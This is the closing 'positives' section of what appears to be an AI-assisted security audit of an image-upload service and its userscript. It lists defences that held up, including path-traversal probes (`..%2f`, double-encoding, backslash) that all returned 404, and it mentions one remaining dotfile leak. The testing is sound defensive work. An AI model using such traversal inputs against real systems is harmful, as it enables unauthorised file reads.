## 9. Positives — keep these working

- **Path traversal in `/img/<name>` is genuinely blocked** (`Path(name).name`): `..%2f`, double-encoding, dots, backslash → all 404. Only the same-directory dotfile leak (C1) remains.
- **Upload filename never reaches the filesystem** — extension allowlist + `{epoch}-{uuid10}` naming → no arbitrary write/overwrite.
- **Strong token generation/storage:** `uuid4().hex` (122 bits), 0600 perms, env override, explicit `off`.
- **Multipart upload path streams with a 12 MiB cap** and deletes partial files on failure.
- **No API key/Authorization/Referer/cookies sent to third-party image hosts** (verified live headers).
- **No secrets committed:** 0 commits, real host only in gitignored `*.local.sh`, no passwords/sshpass/LAN IPs in scripts.
- **Userscript auth model is right where it matters:** token in GM storage (not page localStorage), never logged, no XSS in the settings sheet.

---

*Report generated from the `codebase-audit` workflow (5 audits + cross-validation). Raw findings: shared store keys `findings:security-secrets-hig`, `userscript-security-findings`, `code-quality-dead-weight`, `test-coverage-correc`, `validation:cross-validated`; this report is also stored under `report:final`.*
